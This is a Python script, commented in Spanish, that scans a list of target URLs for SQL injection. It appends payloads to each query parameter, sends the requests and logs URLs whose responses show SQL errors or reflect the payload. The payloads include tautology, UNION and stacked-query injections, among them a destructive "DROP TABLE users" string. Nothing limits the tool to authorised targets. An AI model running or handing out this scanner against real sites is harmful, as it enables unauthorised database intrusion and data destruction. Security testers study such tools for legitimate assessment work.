import requests
import urllib.parse
import time
import argparse
from colorama import Fore, Style

# Payloads clásicos de SQL Injection
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT null,null --",
    "' OR 'a'='a"
]

# Indicadores comunes de errores SQL en la respuesta
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sqlite error",
    "syntax error",
    "invalid query"
]

def cargar_targets(archivo):
    with open(archivo, "r") as f:
        return [line.strip() for line in f if line.strip()]

def analizar_respuesta(respuesta):
    contenido = respuesta.text.lower()
    return any(error in contenido for error in SQL_ERRORS)

def probar_payloads_en_url(url):
    resultados = []
    for payload in PAYLOADS:
        url_inyectada = inyectar_payload(url, payload)
        try:
            respuesta = requests.get(url_inyectada, timeout=10)
            if analizar_respuesta(respuesta):
                resultados.append((payload, "error-based"))
            elif respuesta.status_code == 200 and payload.lower() in respuesta.text.lower():
                resultados.append((payload, "reflected"))
        except requests.RequestException as e:
            print(f"{Fore.YELLOW}[!] Error al probar {url_inyectada}: {e}{Style.RESET_ALL}")
    return resultados

def inyectar_payload(url, payload):
    partes = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qs(partes.query)
    nueva_query = {k: v[0] + payload for k, v in query.items()}
    nueva_query_str = urllib.parse.urlencode(nueva_query)
    nueva_url = urllib.parse.urlunsplit((partes.scheme, partes.netloc, partes.path, nueva_query_str, partes.fragment))
    return nueva_url

def escanear_urls(lista_urls):
    encontrados = []
    for url in lista_urls:
        print(f"{Fore.CYAN}[*] Probando URL: {url}{Style.RESET_ALL}")
        resultados = probar_payloads_en_url(url)
        if resultados:
            for payload, tipo in resultados:
                print(f"{Fore.RED}[+] Posible SQLi ({tipo}) en: {url} | Payload: {payload}{Style.RESET_ALL}")
                encontrados.append({"url": url, "payload": payload, "tipo": tipo})
        else:
            print(f"{Fore.GREEN}[-] Sin indicios en: {url}{Style.RESET_ALL}")
        time.sleep(0.5)
    return encontrados

def guardar_reporte(resultados, archivo="reporte_sql_injection.txt"):
    with open(archivo, "w", encoding="utf-8") as f:
        for res in resultados:
            f.write(f"[+] Posible SQLi ({res['tipo']}) en: {res['url']} | Payload: {res['payload']}\n")
    print(f"\n{Fore.BLUE}[✔] Reporte guardado en {archivo}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description="Escáner automatizado de SQL Injection en múltiples URLs")
    parser.add_argument("-t", "--targets", required=True, help="Archivo con URLs objetivo (targets.txt)")
    parser.add_argument("-o", "--output", default="reporte_sql_injection.txt", help="Archivo de salida con resultados")
    args = parser.parse_args()

    urls = cargar_targets(args.targets)
    resultados = escanear_urls(urls)
    if resultados:
        guardar_reporte(resultados, args.output)
    else:
        print(f"{Fore.GREEN}[✓] No se detectaron vulnerabilidades evidentes.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
